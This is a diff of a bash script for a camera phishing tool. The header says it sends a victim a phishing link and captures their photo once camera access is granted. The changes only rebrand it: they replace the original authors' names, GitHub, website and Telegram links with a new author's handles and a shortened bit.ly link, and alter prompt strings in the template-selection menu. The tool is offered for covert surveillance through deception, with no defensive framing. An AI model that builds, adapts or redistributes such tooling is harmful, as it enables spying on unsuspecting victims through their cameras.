@@ -1,13 +1,12 @@
 #!/bin/bash
 
-# CamHacker
+# HACK-CAMERA 
 # Version    : 2.1
 # Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra, SUMAN, Online Hacking
-# Github     : https://github.com/OnlineHacKing/
-# Email      : info@onlinehacking.in
-# Credits    : Noob-Hackers, TechChipNet, LinuxChoice, CamHacker
-# Date       : 21-04-2022
+# Author     : X PHANTOM PH4N70M
+# Github     : https://github.com/XPH4N70M/
+# Join Us    : https://bit.ly/3LAy80f
+# Date       : 29-05-2022
 # Language   : Shell, HTML, Css
 # Portable File
 # If you copy, consider giving credit! We keep our code open source to help others
@@ -382,7 +381,7 @@ ${cyan}[${white}0${cyan}] ${yellow}Exit${blue}
 "
 
 sleep 1
-printf "${cyan}\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+printf "${cyan}\nXPHANTOM${nc}@${blue}PH4N70M ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
@@ -390,7 +389,7 @@ read option
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
-        printf "\n${ask}Enter festival name:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read fest_name
         if [ -z $fest_name ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -401,7 +400,7 @@ read option
         fi
     elif echo $option | grep -q "3"; then
         dir="live"
-        printf "\n${ask}Enter youtube video ID:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+        printf "\n${ask}Enter youtube video ID:${cyan}\n\nXPhantom${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read vid_id
         if [ -z $vid_id ]; then
             echo -e "\n${error}Invalid input!\n\007"
@@ -419,7 +418,7 @@ read option
             export TN="Cloudflared"
         fi
     elif echo $option | grep -q "i"; then
-        printf "\n${ask}Enter Directory:${cyan}\n\nOnline${nc}@${cyan}Hacking ${red}$ ${nc}"
+        printf "\n${ask}Enter Directory:${cyan}\n\nXPHANTOM${nc}@${blue}XPH4N70M ${red}$ ${nc}"
         read dire
         if ! [ -d $dire ]; then
             echo -e "\n${error}Invalid directory!\n\007"
@@ -432,17 +431,17 @@ read option
     elif echo $option | grep -q "x"; then
         clear
         echo -e "$logo"
-        echo -e "$red[ToolName]  ${cyan}  :[CameraHack]
+        echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
 $red[Version]    ${cyan} :[2.1]
 $red[Description]${cyan} :[Camera Phishing tool]
-$red[Author]     ${cyan} :[KasRoudra, Suman, OnlineHacking]
-$red[Github]     ${cyan} :[https://github.com/OnlineHacKing] 
-$red[Website]    ${cyan} :[https://www.onlinehacking.in/]
-$red[Telegarm]   ${cyan} :[https://t.me/onlinehacking]"
-printf "${cyan}\nCam${nc}@${cyan}Hacker ${red}$ ${nc}"
+$red[Author]     ${cyan} :[XPHANTOM PH4N70M]
+$red[Github]     ${cyan} :[https://github.com/XPH4N70M] 
+$red[Join us]    ${cyan} :[https://bit.ly/3LAy80f]
+$red[Telegarm]   ${cyan} :[https://t.me/x_PH4N7OM]"
+printf "${cyan}\nXPHANTOM${nc}@${cyan}XPH4N70M ${red}$ ${nc}"
 read about
     elif echo $option | grep -q "m"; then
-        xdg-open "https://www.onlinehacking.in/"
+        xdg-open "https://bit.ly/3LAy80f"
     elif echo $option | grep -q "0"; then
         exit 0
     else
